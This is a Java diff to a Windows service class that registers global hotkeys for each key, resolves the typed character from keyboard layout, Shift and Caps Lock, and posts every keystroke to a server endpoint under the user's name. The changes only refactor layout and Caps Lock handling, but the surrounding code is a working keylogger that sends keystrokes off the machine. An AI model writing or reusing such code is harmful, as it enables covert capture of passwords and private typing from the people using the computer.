@@ -96,29 +96,26 @@ public class UserWindowsKeyListenerService implements LocaleService {
 						User32.UnregisterHotKey(null, this.id + 4000);
 						
 						final int idTemp = this.id;
-						final boolean isRus = this.isRus;
-						final boolean isCapsLock = this.isCapsLock;
+						final boolean isRus = User32.GetKeyboardLayout(User32.GetWindowThreadProcessId(User32.GetForegroundWindow(), 0)) == 25 ? true : false;
 						
 						CompletableFuture.runAsync(() -> {	
 							Thread.currentThread().setName("Отправление клавиши на сервер");
 							
 							boolean isRusTemp = isRus;
-							boolean isCapsLockTemp = isCapsLock;
 							
 							if(idTemp == 20)
-								isCapsLockTemp = !isCapsLockTemp;
+								this.isCapsLock = !this.isCapsLock;
 
-							isRusTemp = User32.GetKeyboardLayout(User32.GetWindowThreadProcessId(User32.GetForegroundWindow(), 0)) == 25 ? true : false;
 							String key = isRusTemp ? getRusKey(idTemp) : getEngKey(idTemp);
 						
 							if(User32.GetKeyState(16) < 0){
 								key = this.getShiftKey(idTemp, key);
-							}else if(isCapsLockTemp){
+							}else if(this.isCapsLock){
 								if(65 <= idTemp && idTemp <= 90){
 									key = key.toUpperCase();
 								}
 							}
-							LOG.info("ID: {} - ({})", this.id, key);
+							LOG.info("ID: {} - ({})", idTemp, key);
 							
 							this.restTemplate.postForObject(Resources.URL_TO_KOLAER_RESTFUL.toString() + "system/user/" + username + "/key", key, String.class);
 							
@@ -151,7 +148,7 @@ public class UserWindowsKeyListenerService implements LocaleService {
 						}
 
 						User32.RegisterHotKey(null, this.id, 0, this.id);
-						if(id>40) {
+						if(this.id>40) {
 							User32.RegisterHotKey(null, this.id + 1000, 0x0001, this.id);
 							User32.RegisterHotKey(null, this.id + 2000, 0x0002, this.id);
 							User32.RegisterHotKey(null, this.id + 3000, 0x0004, this.id);
